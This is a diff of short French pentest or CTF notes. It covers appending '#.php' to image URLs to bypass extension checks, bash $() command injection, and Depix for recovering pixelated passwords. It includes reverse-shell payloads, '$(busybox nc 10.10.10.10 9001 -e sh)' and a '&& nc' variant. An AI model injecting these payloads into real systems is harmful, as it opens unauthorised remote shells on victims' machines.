@@ -1,8 +1,8 @@
 
 
-Dans un url d'image ou autre du syle http://test.com/image.jpg
+Dans un url d'image ou autre du style http://test.com/image.jpg
 
-on peut ajouter n'importe quoi apres en rajoutant un # u genre :
+on peut ajouter n'importe quoi apres en rajoutant un # du genre :
 
 http://test.com/image.jpg#.php
 
@@ -26,3 +26,5 @@ Explication : La syntaxe `$()` en bash est utilisée pour exécuter une commande
 Si cela affiche bien le resultat on peut trouver un bon payload pour exploit. On peut le faire avec la commande busybox qui fait juste la commande qui est apres (`pwd` = `busybox pwd`) soit par exemple : 
 * $(busybox nc 10.10.10.10 9001 -e sh)
 * & & nc 10.10.10.10 9001 -e sh
+
+Tools --> depix to Depix to recover passwords from pixelized screenshots
